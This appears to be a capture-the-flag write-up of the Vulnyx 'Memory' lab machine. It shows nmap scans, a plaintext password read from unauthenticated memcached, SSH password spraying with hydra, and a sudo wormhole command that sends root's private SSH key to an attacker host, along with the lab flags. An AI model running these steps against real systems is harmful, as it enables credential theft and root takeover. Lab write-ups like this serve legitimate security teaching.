# Vulnyx: Memory

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Easy |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `memcdump` · `memccat` · `gobuster` · `hydra` · `wormhole` |
| **Tags** | `#Memcached` `#InfoDisclosure` `#PasswordSpraying` `#SudoAbuse` `#Exfiltration` |
| **URL** | https://vulnyx.com/machines/ |

An unauthenticated `memcached` instance leaks a stored password directly. Without a matching username, that password is sprayed across a whole list of common names over SSH instead of the other way around, landing valid credentials for `alan`. From there, a `sudo` rule around `wormhole` — a tool built for secure file transfer between two consenting parties — is repurposed to exfiltrate root's private SSH key.

## Enumeration
### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn memory.nyx

PORT     STATE  SERVICE   REASON
22/tcp   open   ssh       syn-ack ttl 64
80/tcp   open   http      syn-ack ttl 64
11211/tcp open  memcache  syn-ack ttl 64
MAC Address: 08:00:27:AB:58:3F (Oracle VirtualBox virtual NIC)
```

Three ports come back open: **22 (SSH)**, **80 (HTTP)**, and **11211**, the default port for `memcached`. A version and script scan on all three fills in the details:

```bash
$ sudo nmap -p 22,80,11211 -sCV memory.nyx

PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp    open   http       Apache httpd 2.4.65 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.65 (Debian)
11211/tcp open   memcached  Memcached 1.6.18 (uptime 98 seconds)
MAC Address: 08:00:27:AB:58:3F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; Device: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Memcached Enumeration

```bash
$ sudo nmap -n -sV --script memcached-info -p 11211 memory.nyx

PORT      STATE  SERVICE    VERSION
11211/tcp open   memcached  Memcached 1.6.18 (uptime 160 seconds)
| memcached-info:
|   Process ID: 451
|   Uptime: 160 seconds
|   Server time: 2026-07-28T21:11:40
|   Architecture: 64 bit
|   Used CPU (user): 0.090342
|   Used CPU (system): 0.075006
|   Current connections: 2
|   Total connections: 5
|   Maximum connections: 1024
|   TCP Port: 11211
|   UDP Port: 0
|_  Authentication: no
MAC Address: 08:00:27:AB:58:3F (Oracle VirtualBox virtual NIC)
```

`memcached` is a key-value cache, and by default it has no authentication at all — anything that can reach the port can read and write every key stored in it. `memcdump` lists all stored keys, and `memccat` reads the interesting one:

```bash
$ memcdump --servers=memory.nyx
password
```

```bash
$ memccat --servers=memory.nyx password
NewPassword2025
```

The `password` key holds a plaintext value, presumably meant for some internal service rather than for public reach.

### Web Enumeration

```
http://memory.nyx
```

<img src="../Images/memory/Pasted image 20260729112014.png"/>

```bash
$ gobuster dir -u 'http://memory.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html            (Status: 200) [Size: 10701]
server-status          (Status: 403) [Size: 275]
Progress: 882232 / 882232 (100.00%)
===============================================================
Finished
===============================================================
```

The web root is just the default Apache page with nothing hidden behind it, so the memcached password is the only real lead into the box.

## Initial Access

### Password Spraying via SSH

With a password but no matching username, the spray runs in reverse: one fixed password — the value pulled from `memcached` — against a whole list of common names:

```bash
$ hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -p 'NewPassword2025' ssh://memory.nyx -t 64 -f

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to red
uce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a
 previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10713 login tries (l:10713/p:1), ~168 trie
s per task
[DATA] attacking ssh://memory.nyx:22/
[22][ssh] host: memory.nyx   login: alan   password: NewPassword2025
[STATUS] attack finished for memory.nyx (wareh) (1 valid password found)
```

`alan` comes back as a valid account.

> **Credentials:** `alan:NewPassword2025`

### Shell as alan

```bash
$ ssh alan@memory.nyx
alan@memory.nyx's password:
alan@memory:~$ id
uid=1000(alan) gid=1000(alan) groups=1000(alan)
alan@memory:~$ ls -l /home/alan/
total 4
-r-------- 1 alan alan 33 Nov 30  2025 user.txt
alan@memory:~$ cat /home/alan/user.txt
9d1e64f050e5b8ebf3b78fa84199b3cd
```

> **User flag:** `9d1e64f050e5b8ebf3b78fa84199b3cd`

## Privilege Escalation

### Exfiltration via `sudo wormhole`

```bash
alan@memory:~$ sudo -l
Matching Defaults entries for alan on memory:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User alan may run the following commands on memory:
    (root) NOPASSWD: /usr/bin/wormhole
```

`alan` can run `/usr/bin/wormhole` as root. `wormhole` (from `magic-wormhole`) is a legitimate tool for sending a file securely between two machines using a short, one-time code — but it doesn't care *what* file it's sending, only that the process running it can read it. Run as root through `sudo`, that includes files a normal user never could:

```bash
alan@memory:~$ sudo /usr/bin/wormhole --help
Usage: wormhole [OPTIONS] COMMAND [ARGS]...

  Create a Magic Wormhole and communicate through it.

  Wormholes are created by speaking the same magic CODE in two different
  places at the same time.  Wormholes are secure against anyone who doesn't
  use the same code.

Options:
  --appid APPID              appid to use
  --relay-url URL            rendezvous relay to use
  --transit-helper tcp:HOST:PORT  transit relay to use
  --dump-timing FILE.json    (debug) write timing data to file
  --version                  Show the version and exit.
  --help                     Show this message and exit.

Commands:
  help
  receive  Receive a text message, file, or directory (from 'wormhole send')
  send     Send a text message, file, or directory
  ssh      Facilitate sending/receiving SSH public keys
```

```bash
alan@memory:~$ sudo /usr/bin/wormhole send /root/.ssh/id_rsa
Sending 2.6 kB file named 'id_rsa'
Wormhole code is: 46-informant-scotland
On the other computer, please run:

wormhole receive 46-informant-scotland

Sending (←<ATTACKER_IP>:49124)..
100%|████████████████████████████████████████████| 2.59k/2.59k [00:00<00:00, 772kB/s]
File sent.. waiting for confirmation
Confirmation received. Transfer complete.
alan@memory:~$
```

The send generates a one-time code, used on the attacker side to receive the file:

```bash
$ wormhole receive 46-informant-scotland
Receiving file (2.6 kB) into: 'id_rsa'
ok? (Y/n): Y
Receiving (←tcp:memory.nyx:41055)..
100%|████████████████████████████████████████████| 2.59k/2.59k [00:00<00:00, 10.5kB/s]
Received file written to id_rsa
```

With root's private key in hand, SSH gives a root shell directly:

```bash
$ ssh root@memory.nyx -i id_rsa
root@memory:~# id
uid=0(root) gid=0(root) groups=0(root)
root@memory:~# ls -l /root
total 4
-r-------- 1 root root 33 Nov 30  2025 root.txt
root@memory:~# cat /root/root.txt
db516ff5b787b724346d84f61fc5c702
```

> **Root flag:** `db516ff5b787b724346d84f61fc5c702`

## Takeaways

- `memcached` with no authentication is a full read/write data store open to anyone who can reach the port — treating it as a place to stash secrets, even temporarily, assumes a trust boundary that doesn't actually exist by default.
- A leaked credential without a matching username is still useful — spraying one known password across a list of likely usernames works just as well as the more common username-fixed approach.
- A `sudo` rule doesn't need to be inherently "dangerous" software to be exploitable — a legitimate file-transfer tool run as root will happily transfer any file root can read, secrets included, since it has no concept of what it's *supposed* to be used for.